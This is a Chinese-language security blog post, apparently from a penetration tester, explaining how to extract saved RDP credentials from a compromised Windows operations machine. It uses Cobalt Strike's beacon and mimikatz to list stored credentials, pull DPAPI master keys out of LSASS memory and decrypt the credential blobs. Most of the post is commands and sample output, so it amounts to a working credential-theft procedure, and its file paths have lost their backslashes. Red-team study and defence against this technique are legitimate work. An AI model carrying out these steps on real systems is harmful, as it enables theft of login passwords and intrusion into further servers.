---
title: 获取远程主机保存的RDP凭据密码
url: https://www.secpulse.com/archives/189762.html
source: 安全脉搏
date: 2022-10-25
fetch_date: 2025-10-03T20:45:40.180520
---

# 获取远程主机保存的RDP凭据密码

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# 获取远程主机保存的RDP凭据密码

[Windows](https://www.secpulse.com/archives/category/articles/system/windows)

[hackctf](https://www.secpulse.com/newpage/author?author_id=34005)

2022-10-24

43,722

拿下一台运维机，上了个CS，发现曾经连接过几台服务器并且保存了凭据，网上查了圈发现CS不支持交互式mimikatz，记录下获取远程主机RDP凭据。

Windows保存RDP凭据的目录是**C:Users用户名AppDataLocalMicrosoftCredentials**

可通过命令行获取，执行: **cmdkey /list**或**powerpick Get-ChildItem C:Usersrasta\_mouseAppDataLocalMicrosoftCredentials -Force**

注意:**cmdkey /list**命令务必在Session会话下执行，system下执行无结果。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189762-1666598561.jpg)

使用cobalt strike中的mimikatz可以获取一部分接下来要用到的masterkey和pbData

```
mimikatz dpapi::cred /in:C:UsersUSERNAMEAppDataLocalMicrosoftCredentialsSESSIONID
```

输出应类似

```
**BLOB**dwVersion          : 00000001 - 1guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}dwMasterKeyVersion : 00000001 - 1guidMasterKey      : {0785cf41-0f53-4be7-bc8b-6cb33b4bb102}dwFlags            : 20000000 - 536870912 (system ; )dwDescriptionLen   : 00000012 - 18szDescription      : 本地凭据数据

algCrypt           : 00006610 - 26128 (CALG_AES_256)dwAlgCryptLen      : 00000100 - 256dwSaltLen          : 00000020 - 32pbSalt             : 726d845b8a4eba29875****10659ec2d5e210a48fdwHmacKeyLen       : 00000000 - 0pbHmackKey         : algHash            : 0000800e - 32782 (CALG_SHA_512)dwAlgHashLen       : 00000200 - 512dwHmac2KeyLen      : 00000020 - 32pbHmack2Key        : cda4760ed3fb1c7874****28973f5b5b403fe31f233dwDataLen          : 000000c0 - 192pbData             : d268f81c64a3867cd7e96d99578295ea55a47fcaad5f7dd6678989117fc565906cc5a8bfd37137171302b34611ba5****e0b94ae399f9883cf80050f0972693d72b35a9a90918a06ddwSignLen          : 00000040 - 64pbSign             : 63239d3169c99fd82404c0e230****37504cfa332bea4dca0655
```

需要关注的是guidMasterKey、pbData，pbData是我们要解密的数据，guidMasterKey是解密所需要的密钥。这里LSASS已经在其缓存中存有这个key因此我们可以使用SeDebugPrivilege获取。

```
beacon> mimikatz !sekurlsa::dpapi
```

```
mimikatz !sekurlsa::dpapi
      [00000001]
      * GUID      :    {0785cf41-0f53-4be7-bc8b-6cb33b4bb102}
      * Time      :    2020/1/3 8:05:02
      * MasterKey :    02b598c2252fa5d8f7fcd***7737644186223f44cb7d958148
      * sha1(key) :    3e6dc57a0fe****a902cfaf617b1322     [00000002]
      * GUID      :    {edcb491a-91d7-4d98-a714-8bc60254179f}
      * Time      :    2020/1/3 8:05:02
      * MasterKey :    c17a4aa87e9848e9f46c8ca81330***79381103f4137d3d97fe202
      * sha1(key) :    5e1b3eb1152d3****6d3d6f90aaeb
```

然后将凭据保存到本地，执行

```
mimikatz "dpapi::cred /in:C:UsersUSERNAMEDesktoptestSESSION /masterkey:对应的GUID key"
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189762-1666598562.jpg)

**本文作者：[hackctf](newpage/author?author_id=34005)**

**本文为安全脉搏专栏作者发布，转载请注明：**[**https://www.secpulse.com/archives/189762.html**](https://www.secpulse.com/archives/189762.html)

Tags: [RDP](https://www.secpulse.com/archives/tag/rdp)、[远程主机](https://www.secpulse.com/archives/tag/%E8%BF%9C%E7%A8%8B%E4%B8%BB%E6%9C%BA)

点赞：
3
[评论：0](#goComment)
收藏：
0

*新浪微博
QQ空间
微信扫一扫*

### 相关文章

* [![Yasso – 强大的内网渗透辅助工具集](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/06/16545088201-300x183.png)

  Yasso – 强大的内网渗…](https://www.secpulse.com/archives/180428.html "详细阅读 Yasso – 强大的内网渗透辅助工具集")
* [![勒索软件即服务与IAB产业浅析](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2021/11/63c9573d6c4a79b815d6b8546238ca4-300x173.jpg)

  勒索软件即服务与IAB产业浅析](https://www.secpulse.com/archives/169331.html "详细阅读 勒索软件即服务与IAB产业浅析")
* [![某学院系统sql注入到服务器沦陷（bypss）](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-161058-1623830794-300x158.png)

  某学院系统sql注入到服务器沦陷（byp…](https://www.secpulse.com/archives/161058.html "详细阅读 某学院系统sql注入到服务器沦陷（bypss）")

评论  (0)

昵称

必填
您当前尚未登录。
[登录？](https://www.secpulse.com/user_login "登录")
[注册](https://www.secpulse.com/user-register)

邮箱

必填（保密）

快来写下你的想法吧！

upload

|  |  |  |
| --- | --- | --- |
| [![]( https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/06/04/6bfc834beda6e9debb9f6b48a215b4bc-290x290.jpeg)](https://www.secpulse.com/newpage/author?author_id=34005aaa) | [hackctf](https://www.secpulse.com/newpage/author?author_id=34005) | |
| 文章数：40 | 积分： 80 |
| 微信公众号：hackctf | |

* [![阿波罗主机安全管理](/wp-content/themes/secpulse2017/img/product-agent.png)](https://linkage.duoyinsu.com)
* [![伏特漏洞扫描云平台](/wp-content/themes/secpulse2017/img/product-fute.png)](https://v.duoyinsu.com)

### 安全问答社区

![安全问答社区](https://www.secpulse.com/wp-content/themes/secpulse2017/img/xcx.png)

### 脉搏官方公众号

![脉搏公众号](https://www.secpulse.com/wp-content/themes/secpulse2017/img/SecPulse.png)

### 活动日程

[显示更多](https://www.secpulse.com/newpage/activity)

#### 2022-06-17

[Gdevops 全球敏捷运维峰会](https://www.bagevent.com/event/8022600?bag_track=AQMB)

#### 2022-05-12

[Mastering the Challenge！——来自The 3rd AutoCS 2022智能汽车信息安全大会的邀请函](https://autocs2022.artisan-event.com/)

#### 2021-11-18

[AutoSW 2021智能汽车软件开发大会](https://autosw2021.artisan-event.com)

#### 2021-06-27

[2021中国国际网络安全博览会暨高峰论坛](http://www.sins-expo.com)

#### 2021-05-27

[The 2nd AutoCS 2021智能汽车信息安全大会](https://artisan-event.com/AutoCS2021/)

#### 2020-12-18

[贝壳找房2020 ICS安全技术峰会](https://www.4hou.com/tickets/bmZO)

#### 2020-12-11

[全球敏捷运维峰会（Gdevops2020）](https://www.bagevent.com/event/6243820?bag_track=AQMB)

#### 2020-12-04

[2020京麒网络安全大会](https://www.huodongxing.com/event/5569026023500)

#### 2020-11-29

[OPPO技术开放日第六期|聚焦应用与数据安全防护](https://mp.weixin.qq.com/s/kXt5PAD3bPcHUZjl6rziCw)

#### 2020-11-27

[EISS-2020企业信息安全峰会之上海站 11.27](https://open.weixin.qq.com/connect/oauth2/authorize?appid=wx187be17d5a2961cf&redirect_uri=httpswww.bagevent.comevent6531722&response_type=code&scope=snsapi_userinfo&state=STATE#wechat_redirect)

#### 2020-09-...